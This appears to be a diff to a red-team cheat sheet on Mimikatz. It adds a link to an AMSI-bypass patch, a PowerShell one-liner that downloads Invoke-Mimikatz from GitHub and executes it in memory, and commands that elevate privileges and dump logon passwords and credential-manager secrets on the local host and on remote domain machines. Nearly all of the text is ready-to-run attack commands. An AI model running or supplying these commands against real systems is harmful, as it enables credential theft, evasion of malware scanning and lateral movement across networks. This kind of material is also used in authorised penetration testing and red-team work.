@@ -1,3 +1,20 @@
+# Add to PowerShell
+- [Patch amsi.dll](https://github.com/okazymyrov/piki/blob/master/PowerShell.md#patching-amsidll-amsiscanbuffer-by-rasta-mouse)
+```powershell
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')
+```
+
+## Invoke-Mimikatz custom commands
+```powershell
+Invoke-Mimikatz -Command '"log mimi.log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
+```
+
+## Invoke-Mimikatz custom commands on remote machines
+```powershell
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::credman"' -ComputerName @("<hostname1>.domain.local", "<hostname2>.domain.local")
+```
+
 # Lists all available provider credentials
 ```console
 mimikatz "log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
